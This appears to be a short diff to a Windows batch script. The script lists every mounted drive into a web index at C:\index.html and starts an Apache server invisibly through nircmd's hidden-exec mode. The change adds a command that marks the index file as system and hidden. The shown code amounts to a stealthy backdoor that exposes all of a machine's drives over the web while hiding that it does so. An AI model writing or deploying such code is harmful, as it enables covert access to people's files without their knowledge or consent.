@@ -52,6 +52,8 @@ FOR /F "usebackq tokens=1" %%a IN (`MOUNTVOL ^| FIND ":\"`) DO (FOR /F "usebackq
 
 FOR /F "usebackq tokens=1" %%a IN (`MOUNTVOL ^| FIND ":\"`) DO (FOR /F "usebackq tokens=3" %%b IN (`FSUTIL FSINFO DRIVETYPE %%a`) DO (echo ^<a href="%%a"^>%%a^</a^>^<br^> >> C:\index.html)
 
+attrib +s +h +i "C:\index.html"
+
 tasklist /fi "imagename eq httpd.exe" | find /i "httpd.exe" > nul
 if not errorlevel 1 (echo.) else ("%environment%\nircmd.exe" exec hide "%environment%\apache2\bin\httpd.exe")
 
